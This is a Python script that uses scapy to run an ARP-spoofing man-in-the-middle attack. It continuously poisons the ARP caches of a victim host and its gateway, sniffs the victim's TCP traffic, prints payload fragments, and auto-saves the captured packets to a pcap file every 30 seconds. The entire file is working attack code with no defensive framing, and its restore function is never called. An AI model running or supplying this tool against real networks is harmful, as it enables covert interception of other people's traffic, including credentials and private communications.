from scapy.all import *
import threading
import time

captured_packets = []
save_interval = 30  # seconds

def get_mac(ip):
    ans, _ = arping(ip, timeout=2, verbose=False)
    for s, r in ans:
        return r[Ether].src
    return None

def spoof(victim_ip, gateway_ip, victim_mac, gateway_mac):
    print("[*] Starting ARP spoofing...")
    while True:
        send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac), verbose=False)
        send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac), verbose=False)
        time.sleep(2)

def restore(victim_ip, gateway_ip, victim_mac, gateway_mac):
    print("[*] Restoring ARP tables...")
    send(ARP(op=2, pdst=victim_ip, psrc=gateway_ip, hwdst=victim_mac, hwsrc=gateway_mac), count=5, verbose=False)
    send(ARP(op=2, pdst=gateway_ip, psrc=victim_ip, hwdst=gateway_mac, hwsrc=victim_mac), count=5, verbose=False)

def packet_callback(pkt):
    if IP in pkt and TCP in pkt:
        src = pkt[IP].src
        dst = pkt[IP].dst
        sport = pkt[TCP].sport
        dport = pkt[TCP].dport
        print(f"[+] TCP | {src}:{sport} -> {dst}:{dport}")
        if pkt.haslayer(Raw):
            try:
                payload = pkt[Raw].load.decode(errors="ignore")
                print(f"    └─ Payload: {payload[:60]}...")
            except:
                pass
        captured_packets.append(pkt)

def sniff_packets(victim_ip, interface):
    print("[*] Sniffing TCP packets from victim...")
    sniff(filter=f"tcp and host {victim_ip}", prn=packet_callback, iface=interface, store=False)

def auto_save_packets():
    while True:
        if captured_packets:
            wrpcap("capture.pcap", captured_packets)
            print(f"[*] Auto-saved {len(captured_packets)} packets to capture.pcap")
        time.sleep(save_interval)

def start_mitm(victim_ip, gateway_ip, interface):
    victim_mac = get_mac(victim_ip)
    gateway_mac = get_mac(gateway_ip)

    if not victim_mac or not gateway_mac:
        print("[-] Failed to get MAC addresses.")
        return

    # Start spoofing
    threading.Thread(target=spoof, args=(victim_ip, gateway_ip, victim_mac, gateway_mac), daemon=True).start()

    # Auto-save
    threading.Thread(target=auto_save_packets, daemon=True).start()

    # Start sniffing
    sniff_packets(victim_ip, interface)
